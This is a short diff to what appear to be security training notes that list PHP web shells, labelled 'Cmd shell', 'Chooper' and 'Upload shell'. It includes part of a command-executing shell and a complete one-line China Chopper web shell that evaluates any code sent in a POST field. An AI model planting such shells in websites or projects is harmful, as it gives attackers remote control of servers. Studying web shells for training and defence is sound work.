@@ -28,8 +28,6 @@
 
 1. Cmd shell
 
-- Code
-
 ```
 <?php
 if (isset($_POST['cmd'])) {
@@ -58,9 +56,7 @@ if (isset($_POST['cmd'])) {
 
 ```
 
-- Demo:
-
-<img src = 'https://github.com/NTA06012004/BC-training/blob/main/Week%2012/File%20PNG/1.png'>
+2. 
 
 3. Chooper
 
@@ -68,4 +64,4 @@ if (isset($_POST['cmd'])) {
 <?php @eval($_POST['shell']);?>
 ```
 
-4. 
+4. Upload shell
